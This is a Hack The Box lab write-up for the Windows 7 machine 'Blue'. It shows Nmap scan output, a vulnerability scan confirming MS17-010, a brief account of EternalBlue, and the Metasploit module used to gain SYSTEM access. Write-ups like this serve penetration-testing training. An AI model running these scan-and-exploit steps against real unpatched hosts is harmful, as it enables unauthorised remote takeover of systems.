---
"title": "Hack The Box - Blue"
"date": 2020-03-08
"tags": ["windows", "easy", "eternalblue"]
"keywords": ["windows", "easy", "eternalblue"]
"author": "Ghostbyt3"
"description": "We are going to pwn Blue from Hack The Box."
"featured_image": "/img/htb-blue/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Writeup"
---


![Untitled](/img/htb-blue/1.png)

We are going to pwn Blue from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/51](https://www.hackthebox.eu/home/machines/profile/51)


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%), Microsoft Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m33s, deviation: 1s, median: 1m32s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-03-08T16:52:23+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-08T16:52:25
|_  start_date: 2020-03-08T16:46:59

```

The name of the box is hint, it may be ``eternalblue`` exploit.

We can check that by running nmap script.
>nmap -A -p445 --script vuln 10.10.10.40

```
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```
So my guess is correct.
```
What Is EternalBlue?

EternalBlue is an exploit most likely developed by the NSA as a former zero-day. It was released in 2017 by the Shadow Brokers, a hacker group known for leaking tools and exploits used by the Equation Group, which has possible ties to the Tailored Access Operations unit of the NSA.

EternalBlue, also known as MS17-010, is a vulnerability in Microsoft's Server Message Block (SMB) protocol. SMB allows systems to share access to files, printers, and other resources on the network. The vulnerability is allowed to occur because earlier versions of SMB contain a flaw that lets an attacker establish a null session connection via anonymous login. An attacker can then send malformed packets and ultimately execute arbitrary commands on the target.
```

>https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue

>use exploit windows/smb/ms17_010_eternalblue

![Untitled](/img/htb-blue/2.png)

After Some attempts it worked.[br/](br/)
![Untitled](/img/htb-blue/3.png)[br/](br/)
I got Authority\System directly.

